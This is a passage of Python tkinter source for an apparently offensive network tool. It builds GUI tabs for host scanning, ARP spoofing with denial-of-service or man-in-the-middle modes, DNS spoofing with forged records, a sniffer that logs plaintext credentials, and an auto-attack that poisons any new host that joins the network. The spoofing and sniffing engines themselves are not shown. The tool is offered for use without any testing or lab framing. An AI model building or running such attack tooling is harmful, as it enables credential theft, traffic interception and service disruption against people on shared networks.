            lb_frame, bg=BG2, fg=CYAN, font=('Consolas', 9),
            selectbackground=BG3, selectforeground=ACCENT,
            borderwidth=0, highlightthickness=0,
            height=4, width=22
        )
        self._subnet_lb.pack(side='left', fill='y')
        lb_sb = ttk.Scrollbar(lb_frame, orient='vertical',
                               command=self._subnet_lb.yview)
        self._subnet_lb.configure(yscrollcommand=lb_sb.set)
        lb_sb.pack(side='right', fill='y')

        # Controls to right of listbox
        ctrl = tk.Frame(subnet_body, bg=BG3, padx=10)
        ctrl.pack(side='left', fill='y')

        tk.Label(ctrl, text='Add subnet (CIDR):', font=('Consolas', 8),
                 bg=BG3, fg=TEXT_DIM).pack(anchor='w')
        add_row = tk.Frame(ctrl, bg=BG3)
        add_row.pack(fill='x', pady=(2, 6))
        self._subnet_entry = ttk.Entry(add_row, font=('Consolas', 9), width=18)
        self._subnet_entry.pack(side='left', padx=(0, 6))
        self._subnet_entry.insert(0, '192.168.0.0/24')
        ttk.Button(add_row, text='+ ADD', style='Ghost.TButton',
                   command=self._add_subnet).pack(side='left')

        btn_row = tk.Frame(ctrl, bg=BG3)
        btn_row.pack(fill='x')
        ttk.Button(btn_row, text='✕ REMOVE', style='Ghost.TButton',
                   command=self._remove_subnet).pack(side='left', padx=(0, 6))
        ttk.Button(btn_row, text='⟳ AUTO-DETECT', style='Ghost.TButton',
                   command=self._auto_detect_subnets).pack(side='left')

        # ── Toolbar ───────────────────────────────────────────────────────────
        tb = tk.Frame(f, bg=BG2, pady=7)
        tb.pack(fill='x', padx=10, pady=(4, 0))
        tk.Label(tb, text='  DISCOVERED HOSTS', font=('Consolas', 10, 'bold'),
                 bg=BG2, fg=TEXT).pack(side='left')
        self._enrich_lbl = tk.Label(tb, text='', font=('Consolas', 8),
                                     bg=BG2, fg=YELLOW)
        self._enrich_lbl.pack(side='left', padx=10)
        ttk.Button(tb, text='→ USE IN ATTACK', style='Ghost.TButton',
                   command=self._use_selected).pack(side='right', padx=4)
        ttk.Button(tb, text='CLEAR', style='Ghost.TButton',
                   command=self._clear_selection).pack(side='right', padx=4)
        ttk.Button(tb, text='SELECT ALL', style='Ghost.TButton',
                   command=self._select_all).pack(side='right', padx=4)

        # ── Treeview ──────────────────────────────────────────────────────────
        tree_f = tk.Frame(f, bg=BG)
        tree_f.pack(fill='both', expand=True, padx=10, pady=(4, 2))

        cols = ('sel', 'ip', 'mac', 'vendor', 'hostname', 'netbios', 'os', 'type')
        self._tree = ttk.Treeview(tree_f, columns=cols, show='headings',
                                   selectmode='none')
        self._tree.heading('sel',     text='')
        self._tree.heading('ip',      text='IP ADDRESS')
        self._tree.heading('mac',     text='MAC ADDRESS')
        self._tree.heading('vendor',  text='VENDOR')
        self._tree.heading('hostname',text='HOSTNAME')
        self._tree.heading('netbios', text='COMPUTER NAME')
        self._tree.heading('os',      text='OS GUESS')
        self._tree.heading('type',    text='TYPE')

        self._tree.column('sel',      width=32,  stretch=False, anchor='center')
        self._tree.column('ip',       width=130, anchor='w')
        self._tree.column('mac',      width=150, anchor='w')
        self._tree.column('vendor',   width=150, anchor='w')
        self._tree.column('hostname', width=180, anchor='w')
        self._tree.column('netbios',  width=150, anchor='w')
        self._tree.column('os',       width=110, anchor='w')
        self._tree.column('type',     width=90,  anchor='center')

        # Horizontal + vertical scrollbars
        vsb = ttk.Scrollbar(tree_f, orient='vertical',   command=self._tree.yview)
        hsb = ttk.Scrollbar(tree_f, orient='horizontal', command=self._tree.xview)
        self._tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self._tree.grid(row=0, column=0, sticky='nsew')
        vsb.grid(row=0, column=1, sticky='ns')
        hsb.grid(row=1, column=0, sticky='ew')
        tree_f.rowconfigure(0, weight=1)
        tree_f.columnconfigure(0, weight=1)

        self._tree.bind('<ButtonRelease-1>', self._toggle_select)
        self._tree.tag_configure('gateway', foreground=YELLOW)
        self._tree.tag_configure('host',    foreground=TEXT)
        self._tree.tag_configure('checked', foreground=GREEN)
        self._tree.tag_configure('pending', foreground=TEXT_DIM)

        hint = tk.Frame(f, bg=BG2, pady=4)
        hint.pack(fill='x', padx=10)
        tk.Label(hint, text='  Click a row to select/deselect  |  Hostname & Computer Name fill in after scan',
                 font=('Consolas', 8), bg=BG2, fg=TEXT_DIM).pack(side='left')

    # ── DNS Spoof tab ─────────────────────────────────────────────────────────

    def _build_dns_tab(self):
        f = self._tab_dns

        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ⬡  DNS SPOOF  —  Redirect domains to custom IPs',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Intercepts DNS queries routed through this machine and replies with forged A records.\n'
                      '  Requires MITM mode active in Attack tab first. Add domain→IP rules below.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        # Bottom bar first (tkinter packing order)
        btn_bar = tk.Frame(f, bg=BG2, pady=8)
        btn_bar.pack(fill='x', side='bottom', padx=10)
        self._dns_start_btn = ttk.Button(btn_bar, text='▶  START SPOOF',
                                          style='Accent.TButton',
                                          command=self._dns_start)
        self._dns_start_btn.pack(side='left', padx=(0, 8))
        self._dns_stop_btn = ttk.Button(btn_bar, text='■  STOP',
                                         style='Ghost.TButton',
                                         command=self._dns_stop,
                                         state='disabled')
        self._dns_stop_btn.pack(side='left')
        self._dns_badge_var = tk.StringVar(value='● IDLE')
        tk.Label(btn_bar, textvariable=self._dns_badge_var,
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=TEXT_DIM).pack(side='left', padx=16)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=14, pady=10)

        # Info
        info = tk.Frame(body, bg=BG3, padx=14, pady=10)
        info.pack(fill='x', pady=(0, 10))
        tk.Label(info,
                 text='Intercepts DNS queries passing through this machine and replies with your\n'
                      'chosen IP. Requires MITM mode to be active in the Attack tab first.',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM, justify='left').pack(anchor='w')

        # Add rule row
        add_f = tk.Frame(body, bg=BG)
        add_f.pack(fill='x', pady=(0, 8))
        tk.Label(add_f, text='Domain contains:', font=('Consolas', 9),
                 bg=BG, fg=TEXT_DIM).pack(side='left')
        self._dns_domain_var = tk.StringVar()
        ttk.Entry(add_f, textvariable=self._dns_domain_var,
                  font=('Consolas', 9), width=22).pack(side='left', padx=6)
        tk.Label(add_f, text='→  Redirect to IP:', font=('Consolas', 9),
                 bg=BG, fg=TEXT_DIM).pack(side='left')
        self._dns_ip_var = tk.StringVar()
        ttk.Entry(add_f, textvariable=self._dns_ip_var,
                  font=('Consolas', 9), width=16).pack(side='left', padx=6)
        ttk.Button(add_f, text='+ Add Rule', style='Accent.TButton',
                   command=self._dns_add_rule).pack(side='left', padx=4)

        # Rules treeview
        tree_f = tk.Frame(body, bg=BG3, padx=2, pady=2)
        tree_f.pack(fill='both', expand=True)

        th = tk.Frame(tree_f, bg=BG3, pady=6)
        th.pack(fill='x', padx=8)
        tk.Label(th, text='SPOOF RULES', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(side='left')
        ttk.Button(th, text='Remove Selected', style='Ghost.TButton',
                   command=self._dns_remove_rule).pack(side='right', padx=4)
        ttk.Button(th, text='Clear All', style='Ghost.TButton',
                   command=self._dns_clear_rules).pack(side='right', padx=4)

        cols = ('domain', 'redirect')
        self._dns_tree = ttk.Treeview(tree_f, columns=cols, show='headings',
                                       selectmode='extended', height=10)
        self._dns_tree.heading('domain',   text='Domain Pattern')
        self._dns_tree.heading('redirect', text='Redirect IP')
        self._dns_tree.column('domain',   width=300, anchor='w')
        self._dns_tree.column('redirect', width=160, anchor='w')
        dns_sb = ttk.Scrollbar(tree_f, orient='vertical',
                               command=self._dns_tree.yview)
        self._dns_tree.configure(yscrollcommand=dns_sb.set)
        dns_sb.pack(side='right', fill='y')
        self._dns_tree.pack(fill='both', expand=True, padx=8, pady=(0, 8))

        # Log
        log_hdr = tk.Frame(body, bg=BG2, pady=5)
        log_hdr.pack(fill='x', pady=(6, 0))
        tk.Label(log_hdr, text='  SPOOF LOG', font=('Consolas', 9, 'bold'),
                 bg=BG2, fg=TEXT).pack(side='left')
        ttk.Button(log_hdr, text='CLEAR', style='Ghost.TButton',
                   command=lambda: self._clear_textbox(self._dns_log)).pack(side='right', padx=6)
        self._dns_log = tk.Text(body, bg=BG, fg=GREEN, font=('Consolas', 9),
                                 relief='flat', height=7, state='disabled', padx=8, pady=4)
        self._dns_log.tag_configure('error',   foreground=ACCENT)
        self._dns_log.tag_configure('success', foreground=GREEN)
        self._dns_log.tag_configure('warn',    foreground=YELLOW)
        self._dns_log.pack(fill='x')

    def _dns_add_rule(self):
        domain = self._dns_domain_var.get().strip()
        ip     = self._dns_ip_var.get().strip()
        if not domain or not ip:
            return
        self._dns_tree.insert('', 'end', values=(domain, ip))
        self._dns_domain_var.set('')
        self._dns_ip_var.set('')
        if self._dns_engine:
            self._dns_engine.rules[domain] = ip

    def _dns_remove_rule(self):
        for item in self._dns_tree.selection():
            domain = self._dns_tree.item(item, 'values')[0]
            self._dns_tree.delete(item)
            if self._dns_engine:
                self._dns_engine.rules.pop(domain, None)

    def _dns_clear_rules(self):
        for item in self._dns_tree.get_children():
            self._dns_tree.delete(item)
        if self._dns_engine:
            self._dns_engine.rules.clear()

    def _dns_start(self):
        iface = self._iface.get()
        if not iface:
            return
        rules = {self._dns_tree.item(i, 'values')[0]: self._dns_tree.item(i, 'values')[1]
                 for i in self._dns_tree.get_children()}
        if not rules:
            self._dns_log_write('[-] Add at least one rule first', 'error')
            return
        self._dns_engine = DNSSpoofEngine(iface, self._dns_log_write)
        self._dns_engine.rules = rules
        self._dns_engine.start()
        self._dns_start_btn.configure(state='disabled')
        self._dns_stop_btn.configure(state='normal')
        self._dns_badge_var.set('● SPOOFING')

    def _dns_stop(self):
        if self._dns_engine:
            self._dns_engine.stop()
            self._dns_engine = None
        self._dns_start_btn.configure(state='normal')
        self._dns_stop_btn.configure(state='disabled')
        self._dns_badge_var.set('● STOPPED')

    def _dns_log_write(self, msg, level=''):
        def _do():
            self._dns_log.configure(state='normal')
            ts = time.strftime('%H:%M:%S')
            tag = level if level in ('error', 'success', 'warn') else ''
            self._dns_log.insert('end', f'[{ts}]  {msg}\n', tag)
            self._dns_log.see('end')
            self._dns_log.configure(state='disabled')
            self.log(msg, level)
        self.after(0, _do)

    # ── Packet Sniffer tab ────────────────────────────────────────────────────

    def _build_sniffer_tab(self):
        f = self._tab_sniffer

        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ◎  PACKET SNIFFER  —  HTTP / DNS / Credentials',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  Passive capture — logs HTTP requests, DNS queries, and plaintext credentials in real time.\n'
                      '  Most effective when MITM mode is active so victim traffic flows through this machine.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        # Toolbar
        tb = tk.Frame(f, bg=BG3, pady=8, padx=12)
        tb.pack(fill='x')
        tk.Label(tb, text='Filter:', font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='left')
        self._sniff_filter = ttk.Combobox(tb, font=('Consolas', 9), width=28,
                                           values=['tcp or udp port 53',
                                                   'tcp port 80',
                                                   'udp port 53',
                                                   'tcp port 21 or tcp port 23',
                                                   ''])
        self._sniff_filter.current(0)
        self._sniff_filter.pack(side='left', padx=6)
        self._sniff_start_btn = ttk.Button(tb, text='▶  START',
                                            style='Accent.TButton',
                                            command=self._sniffer_start)
        self._sniff_start_btn.pack(side='left', padx=6)
        self._sniff_stop_btn = ttk.Button(tb, text='■  STOP',
                                           style='Ghost.TButton',
                                           command=self._sniffer_stop,
                                           state='disabled')
        self._sniff_stop_btn.pack(side='left', padx=(0, 8))
        ttk.Button(tb, text='CLEAR', style='Ghost.TButton',
                   command=self._sniffer_clear).pack(side='left')
        ttk.Button(tb, text='💾 PCAP', style='Ghost.TButton',
                   command=self._sniffer_save_pcap).pack(side='left', padx=4)
        self._sniff_count_var = tk.StringVar(value='0 packets')
        tk.Label(tb, textvariable=self._sniff_count_var,
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='right', padx=8)
        self._sniff_badge_var = tk.StringVar(value='● IDLE')
        tk.Label(tb, textvariable=self._sniff_badge_var,
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=TEXT_DIM).pack(side='right', padx=8)

        # Packet table
        pane = tk.Frame(f, bg=BG)
        pane.pack(fill='both', expand=True, padx=8, pady=6)

        cols = ('time', 'src', 'dst', 'proto', 'info')
        self._sniff_tree = ttk.Treeview(pane, columns=cols, show='headings',
                                         selectmode='browse', height=14)
        self._sniff_tree.heading('time',  text='Time')
        self._sniff_tree.heading('src',   text='Source')
        self._sniff_tree.heading('dst',   text='Destination')
        self._sniff_tree.heading('proto', text='Proto')
        self._sniff_tree.heading('info',  text='Info')
        self._sniff_tree.column('time',  width=75,  anchor='center')
        self._sniff_tree.column('src',   width=120, anchor='w')
        self._sniff_tree.column('dst',   width=120, anchor='w')
        self._sniff_tree.column('proto', width=65,  anchor='center')
        self._sniff_tree.column('info',  width=500, anchor='w')
        self._sniff_tree.tag_configure('cred', foreground=ACCENT)
        self._sniff_tree.tag_configure('dns',  foreground=CYAN)
        self._sniff_tree.tag_configure('http', foreground=GREEN)
        self._sniff_tree.tag_configure('ftp',  foreground=YELLOW)
        sniff_sb = ttk.Scrollbar(pane, orient='vertical',
                                  command=self._sniff_tree.yview)
        self._sniff_tree.configure(yscrollcommand=sniff_sb.set)
        sniff_sb.pack(side='right', fill='y')
        self._sniff_tree.pack(fill='both', expand=True)
        self._sniff_tree.bind('<<TreeviewSelect>>', self._sniffer_on_select)

        # Credential detail pane
        cred_hdr = tk.Frame(f, bg=BG2, pady=5)
        cred_hdr.pack(fill='x', padx=8)
        tk.Label(cred_hdr, text='  CREDENTIAL / BODY DETAIL',
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=ACCENT).pack(side='left')
        self._cred_detail = tk.Text(f, bg=BG3, fg=ACCENT,
                                     font=('Consolas', 9), relief='flat',
                                     height=5, state='disabled', padx=10, pady=6)
        self._cred_detail.pack(fill='x', padx=8, pady=(0, 6))

        self._sniff_count = 0

    def _sniffer_start(self):
        iface = self._iface.get()
        if not iface:
            return
        bpf = self._sniff_filter.get().strip()
        self._sniffer_engine = SnifferEngine(iface, self.log, self._sniffer_on_pkt)
        self._sniffer_engine.start(bpf)
        self._sniff_start_btn.configure(state='disabled')
        self._sniff_stop_btn.configure(state='normal')
        self._sniff_badge_var.set('● SNIFFING')

    def _sniffer_stop(self):
        if self._sniffer_engine:
            self._sniffer_engine.stop()
            self._sniffer_engine = None
        self._sniff_start_btn.configure(state='normal')
        self._sniff_stop_btn.configure(state='disabled')
        self._sniff_badge_var.set('● STOPPED')

    def _sniffer_on_pkt(self, row):
        ts, src, dst, proto, info, creds = row
        def _do():
            tag = ('cred' if creds else
                   'dns'  if proto == 'DNS' else
                   'http' if proto == 'HTTP' else
                   'ftp'  if proto in ('FTP', 'TELNET') else '')
            self._sniff_tree.insert('', 0, values=(ts, src, dst, proto, info),
                                    tags=(tag,))
            self._sniff_count += 1
            self._sniff_count_var.set(f'{self._sniff_count} packets')
            # store creds on item
            if creds:
                iid = self._sniff_tree.get_children()[0]
                self._sniff_tree.set(iid, 'info', f'[CREDS] {info}')
                self._sniff_tree.item(iid, tags=('cred',))
            # keep table at max 500 rows
            children = self._sniff_tree.get_children()
            if len(children) > 500:
                self._sniff_tree.delete(children[-1])
        self.after(0, _do)

    def _sniffer_on_select(self, _event):
        sel = self._sniff_tree.selection()
        if not sel:
            return
        # retrieve stored cred detail by matching info text
        # (we embed it in info when creds found)
        item   = sel[0]
        values = self._sniff_tree.item(item, 'values')
        self._cred_detail.configure(state='normal')
        self._cred_detail.delete('1.0', 'end')
        self._cred_detail.insert('end', '\n'.join(values))
        self._cred_detail.configure(state='disabled')

    def _sniffer_clear(self):
        for item in self._sniff_tree.get_children():
            self._sniff_tree.delete(item)
        self._sniff_count = 0
        self._sniff_count_var.set('0 packets')
        self._cred_detail.configure(state='normal')
        self._cred_detail.delete('1.0', 'end')
        self._cred_detail.configure(state='disabled')

    def _clear_textbox(self, widget):
        widget.configure(state='normal')
        widget.delete('1.0', 'end')
        widget.configure(state='disabled')

    # ── Whitelist tab ─────────────────────────────────────────────────────────

    _WHITELIST_FILE = os.path.expanduser('~/.regret/whitelist.json')

    def _load_whitelist(self) -> set:
        try:
            with open(self._WHITELIST_FILE) as fh:
                data = json.load(fh)
                return set(data) if isinstance(data, list) else set()
        except Exception:
            return set()

    def _save_whitelist(self):
        os.makedirs(os.path.dirname(self._WHITELIST_FILE), exist_ok=True)
        with open(self._WHITELIST_FILE, 'w') as fh:
            json.dump(sorted(self._whitelist_ips), fh, indent=2)

    def _build_whitelist_tab(self):
        f = self._tab_whitelist

        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ◻  WHITELIST  —  IPs excluded from all attacks',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  IPs here are silently skipped by every attack engine — Auto-Attack and Lockout included.\n'
                      '  Add your own IP, the gateway, and any hosts that must not be disrupted.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=20, pady=14)

        # ── Info banner ───────────────────────────────────────────────────────
        info = tk.Frame(body, bg=BG3, padx=14, pady=10)
        info.pack(fill='x', pady=(0, 12))
        tk.Label(info,
                 text='Whitelisted IPs are silently skipped by both ARP Attack and Stress Test.\n'
                      'Add your gateway, management hosts, or your own machine here.',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM, justify='left').pack(anchor='w')

        # ── Add row ───────────────────────────────────────────────────────────
        add_row = tk.Frame(body, bg=BG)
        add_row.pack(fill='x', pady=(0, 10))
        tk.Label(add_row, text='IP address:', font=('Consolas', 9),
                 bg=BG, fg=TEXT_DIM, width=12, anchor='w').pack(side='left')
        self._wl_entry_var = tk.StringVar()
        wl_entry = ttk.Entry(add_row, textvariable=self._wl_entry_var,
                             font=('Consolas', 10), width=20)
        wl_entry.pack(side='left', padx=(0, 8))
        wl_entry.bind('<Return>', lambda _e: self._wl_add())

        ttk.Button(add_row, text='+ Add', style='Accent.TButton',
                   command=self._wl_add).pack(side='left', padx=(0, 6))
        ttk.Button(add_row, text='Import scanned', style='Ghost.TButton',
                   command=self._wl_import_scanned).pack(side='left')

        # ── Listbox ───────────────────────────────────────────────────────────
        lb_frame = tk.Frame(body, bg=BG3, padx=2, pady=2)
        lb_frame.pack(fill='both', expand=True)

        list_hdr = tk.Frame(lb_frame, bg=BG3, pady=6)
        list_hdr.pack(fill='x', padx=8)
        tk.Label(list_hdr, text='WHITELISTED IPs', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(side='left')
        self._wl_count_var = tk.StringVar(value='0 entries')
        tk.Label(list_hdr, textvariable=self._wl_count_var,
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM).pack(side='left', padx=12)
        ttk.Button(list_hdr, text='Remove Selected', style='Ghost.TButton',
                   command=self._wl_remove).pack(side='right', padx=4)
        ttk.Button(list_hdr, text='Clear All', style='Ghost.TButton',
                   command=self._wl_clear_all).pack(side='right', padx=4)

        list_inner = tk.Frame(lb_frame, bg=BG3)
        list_inner.pack(fill='both', expand=True, padx=8, pady=(0, 8))

        sb = ttk.Scrollbar(list_inner, orient='vertical')
        self._wl_lb = tk.Listbox(
            list_inner, bg=BG2, fg=CYAN, font=('Consolas', 10),
            selectbackground=BG3, selectforeground=ACCENT,
            borderwidth=0, highlightthickness=0,
            activestyle='none',
            yscrollcommand=sb.set,
            selectmode='extended',
        )
        sb.configure(command=self._wl_lb.yview)
        sb.pack(side='right', fill='y')
        self._wl_lb.pack(side='left', fill='both', expand=True)

        self._wl_refresh_list()

    def _wl_refresh_list(self):
        self._wl_lb.delete(0, 'end')
        for ip in sorted(self._whitelist_ips):
            self._wl_lb.insert('end', f'  {ip}')
        self._wl_count_var.set(f'{len(self._whitelist_ips)} entr{"y" if len(self._whitelist_ips)==1 else "ies"}')

    def _wl_add(self):
        raw = self._wl_entry_var.get().strip()
        if not raw:
            return
        # accept multiple IPs separated by comma/space
        for part in raw.replace(',', ' ').split():
            self._whitelist_ips.add(part)
        self._save_whitelist()
        self._wl_refresh_list()
        self._wl_entry_var.set('')

    def _wl_remove(self):
        indices = list(self._wl_lb.curselection())
        if not indices:
            return
        items = [self._wl_lb.get(i).strip() for i in indices]
        for ip in items:
            self._whitelist_ips.discard(ip)
        self._save_whitelist()
        self._wl_refresh_list()

    def _wl_clear_all(self):
        if not self._whitelist_ips:
            return
        if messagebox.askyesno('Clear Whitelist',
                               f'Remove all {len(self._whitelist_ips)} whitelisted IPs?'):
            self._whitelist_ips.clear()
            self._save_whitelist()
            self._wl_refresh_list()

    def _wl_import_scanned(self):
        sel = [h['ip'] for h in self._hosts if h.get('selected')]
        if not sel:
            messagebox.showinfo('Import', 'No hosts selected in Scanner tab.\n'
                                          'Select hosts there first, then import.')
            return
        for ip in sel:
            self._whitelist_ips.add(ip)
        self._save_whitelist()
        self._wl_refresh_list()
        messagebox.showinfo('Import', f'Added {len(sel)} IP(s) to whitelist.')

    # ── Attack tab ────────────────────────────────────────────────────────────

    def _build_attack_tab(self):
        f = self._tab_attack

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  ARP Spoofing — forge replies so targets believe the gateway IP maps to your MAC.\n'
                      '  A-attack = unicast per-host (stealthy, jittered). B-attack = broadcast GARP (faster, louder).',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        top = tk.Frame(f, bg=BG3, pady=10)
        top.pack(fill='x', padx=10, pady=(10, 4))
        tk.Label(top, text='  TARGETS  ', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(side='left')
        self._target_label = tk.Label(top, text='None selected — go to Scanner tab',
                                       font=('Consolas', 9), bg=BG3, fg=TEXT_DIM)
        self._target_label.pack(side='left', padx=4)

        panels = tk.Frame(f, bg=BG)
        panels.pack(fill='both', expand=True, padx=10, pady=4)

        left = tk.Frame(panels, bg=BG3, padx=16, pady=16)
        left.pack(side='left', fill='both', expand=True, padx=(0, 5))

        tk.Label(left, text='ATTACK TYPE', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).grid(row=0, column=0, sticky='w', pady=(0, 8))
        self._atk_type = tk.StringVar(value='perhost')
        ttk.Radiobutton(left, text='A-attack  (Per-Host Spoof)',
                        variable=self._atk_type, value='perhost').grid(row=1, column=0, sticky='w', pady=3)
        tk.Label(left, text='    Targets each host individually',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).grid(row=2, column=0, sticky='w')
        ttk.Radiobutton(left, text='B-attack  (Broadcast)',
                        variable=self._atk_type, value='garp').grid(row=3, column=0, sticky='w', pady=(10, 3))
        tk.Label(left, text='    One broadcast hits every host (garp.py)',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).grid(row=4, column=0, sticky='w')

        tk.Frame(left, bg=BORDER, height=1).grid(row=5, column=0, sticky='ew', pady=12)

        tk.Label(left, text='MODE', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).grid(row=6, column=0, sticky='w', pady=(0, 8))
        self._atk_mode = tk.StringVar(value='dos')
        ttk.Radiobutton(left, text='DoS — drop traffic',
                        variable=self._atk_mode, value='dos').grid(row=7, column=0, sticky='w', pady=3)
        tk.Label(left, text='    IP forwarding OFF → hosts lose internet',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).grid(row=8, column=0, sticky='w')
        ttk.Radiobutton(left, text='MITM — forward traffic',
                        variable=self._atk_mode, value='mitm').grid(row=9, column=0, sticky='w', pady=(10, 3))
        tk.Label(left, text='    IP forwarding ON → silent interception',
                 font=('Consolas', 8), bg=BG3, fg=TEXT_DIM).grid(row=10, column=0, sticky='w')

        right = tk.Frame(panels, bg=BG3, padx=16, pady=16)
        right.pack(side='left', fill='both', expand=True, padx=(5, 0))

        tk.Label(right, text='OPTIONS', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 10))

        self._bw_enabled = tk.BooleanVar(value=False)
        ttk.Checkbutton(right, text='Enable bandwidth limit',
                        variable=self._bw_enabled,
                        command=self._toggle_bw).pack(anchor='w')
        bw_inner = tk.Frame(right, bg=BG3)
        bw_inner.pack(fill='x', pady=4, padx=16)
        self._bw_var = tk.IntVar(value=512)
        self._bw_scale = ttk.Scale(bw_inner, from_=64, to=10000,
                                    variable=self._bw_var, orient='horizontal')
        self._bw_scale.pack(side='left', fill='x', expand=True)
        self._bw_lbl = tk.Label(bw_inner, text='512 kbps',
                                 font=('Consolas', 9), bg=BG3, fg=CYAN, width=10)
        self._bw_lbl.pack(side='left', padx=6)
        self._bw_scale.configure(state='disabled')
        self._bw_var.trace_add('write', self._update_bw_label)

        tk.Frame(right, bg=BORDER, height=1).pack(fill='x', pady=12)

        tk.Label(right, text='Poison interval', font=('Consolas', 9),
                 bg=BG3, fg=TEXT).pack(anchor='w')
        itv_row = tk.Frame(right, bg=BG3)
        itv_row.pack(fill='x', pady=4, padx=16)
        self._interval_var = tk.DoubleVar(value=0.5)
        ttk.Scale(itv_row, from_=0.1, to=5.0, variable=self._interval_var,
                  orient='horizontal').pack(side='left', fill='x', expand=True)
        self._itv_lbl = tk.Label(itv_row, text='0.5 s',
                                  font=('Consolas', 9), bg=BG3, fg=CYAN, width=7)
        self._itv_lbl.pack(side='left', padx=6)
        self._interval_var.trace_add('write', self._update_itv_label)

        tk.Frame(right, bg=BORDER, height=1).pack(fill='x', pady=12)

        tk.Label(right, text='Rescan interval (GARP)', font=('Consolas', 9),
                 bg=BG3, fg=TEXT).pack(anchor='w')
        rs_row = tk.Frame(right, bg=BG3)
        rs_row.pack(fill='x', pady=4, padx=16)
        self._rescan_var = tk.IntVar(value=30)
        ttk.Scale(rs_row, from_=5, to=120, variable=self._rescan_var,
                  orient='horizontal').pack(side='left', fill='x', expand=True)
        self._rs_lbl = tk.Label(rs_row, text='30 s',
                                 font=('Consolas', 9), bg=BG3, fg=CYAN, width=7)
        self._rs_lbl.pack(side='left', padx=6)
        self._rescan_var.trace_add('write', self._update_rs_label)

        btn_f = tk.Frame(f, bg=BG, pady=10)
        btn_f.pack(fill='x', padx=10)
        self._start_btn = ttk.Button(btn_f, text='▶  START ATTACK',
                                      style='Accent.TButton',
                                      command=self._start_attack)
        self._start_btn.pack(side='left', padx=(0, 8))
        self._stop_btn = ttk.Button(btn_f, text='■  STOP & RESTORE',
                                     style='Ghost.TButton',
                                     command=self._stop_attack,
                                     state='disabled')
        self._stop_btn.pack(side='left')

    # ── Auto-Attack tab ───────────────────────────────────────────────────────

    def _build_autoatk_tab(self):
        f = self._tab_autoatk

        hdr = tk.Frame(f, bg=BG2, pady=8)
        hdr.pack(fill='x')
        tk.Label(hdr, text='  ⟳  AUTO-ATTACK  —  Automatically B-attack new hosts',
                 font=('Consolas', 11, 'bold'), bg=BG2, fg=ACCENT).pack(side='left', padx=4)

        # Bottom bar first (tkinter packing order — must be before fill+expand body)
        btn_bar = tk.Frame(f, bg=BG2, pady=8)
        btn_bar.pack(fill='x', side='bottom', padx=10)
        self._aa_start_btn = ttk.Button(btn_bar, text='▶  START AUTO-ATTACK',
                                         style='Accent.TButton',
                                         command=self._autoatk_start)
        self._aa_start_btn.pack(side='left', padx=(0, 8))
        self._aa_stop_btn = ttk.Button(btn_bar, text='■  STOP',
                                        style='Ghost.TButton',
                                        command=self._autoatk_stop,
                                        state='disabled')
        self._aa_stop_btn.pack(side='left')
        self._aa_badge_var = tk.StringVar(value='● IDLE')
        tk.Label(btn_bar, textvariable=self._aa_badge_var,
                 font=('Consolas', 9, 'bold'), bg=BG2, fg=TEXT_DIM).pack(side='left', padx=16)

        body = tk.Frame(f, bg=BG)
        body.pack(fill='both', expand=True, padx=14, pady=8)

        # Info banner
        info = tk.Frame(body, bg=BG3, padx=14, pady=10)
        info.pack(fill='x', pady=(0, 10))
        tk.Label(info,
                 text='Scans all subnets every N seconds. Any new host not present at start\n'
                      'is automatically targeted with a B-attack (GARP broadcast). Whitelisted\n'
                      'IPs and hosts already in the Scanner list are never attacked.\n'
                      'Run a SCAN first so existing hosts are seeded as "known".',
                 font=('Consolas', 9), bg=BG3, fg=TEXT_DIM, justify='left').pack(anchor='w')

        # Controls
        ctrl = tk.Frame(body, bg=BG3, padx=16, pady=14)
        ctrl.pack(fill='x', pady=(0, 10))

        tk.Label(ctrl, text='SCAN INTERVAL', font=('Consolas', 9, 'bold'),
                 bg=BG3, fg=ACCENT).pack(anchor='w', pady=(0, 6))
        itv_row = tk.Frame(ctrl, bg=BG3)
        itv_row.pack(fill='x', padx=8, pady=(0, 12))
